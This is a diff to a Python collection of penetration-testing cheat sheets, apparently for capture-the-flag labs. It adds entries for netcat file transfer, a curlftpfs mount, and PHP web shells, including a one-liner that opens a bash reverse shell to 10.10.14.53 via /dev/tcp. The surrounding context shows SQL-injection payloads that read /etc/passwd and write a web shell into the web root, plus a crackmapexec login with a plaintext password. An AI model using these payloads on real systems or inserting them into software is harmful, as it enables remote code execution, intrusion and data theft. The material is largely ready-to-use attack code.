@@ -268,7 +268,9 @@ crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
 ######################################
 ######################################
 
-cewl = Cheat("cewl - Html to Password list")
+cewl = Cheat(
+    "cewl - Create a list of password (or something) from all words of a html page"
+)
 cewl.category = "Tools"
 cewl.output = """[*] Simple tool to take all word of a html page and create a file
 
@@ -749,4 +751,41 @@ cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 select 'file written successfully!' into outfile '/var/www/html/proof.txt'
 # Write a web shell into the base web directory
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+"""
+
+######################################
+######################################
+
+fileTransfereLinux = Cheat("File Transfere Linux - nc / ftp")
+fileTransfereLinux.category = ""
+fileTransfereLinux.output = """[*] File Transfere Techniques With nc - Linux
+
+nc -nlvp 4646 > file.f     # receiver
+nc <Ip> 4646 < file.f      # sender
+
+[*] File Transfere Techniques With FTP server
+# curlftpfs - mount a ftp host as a local directory
+# The program curlftpfs is a tool to mount remote ftp hosts as local directories. 
+# It connects to the host FTP server and maps its directory structure to the path directory.
+
+curlftpfs anonymous:senhalol@10.10.10.78 $(pwd) 
+"""
+
+######################################
+######################################
+
+webShell = Cheat("WebShell - php")
+webShell.category = "Web"
+webShell.output = """[*] Web Shell em PHP
+
+<?php
+	echo "\\nURL Shell... url?cmd=<command>\\n\\n";
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+
+# Or...
+<?php echo system($_GET['cmd']); exit; ?>
+
+# Or...
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.53/443 0>&1'");?>
 """
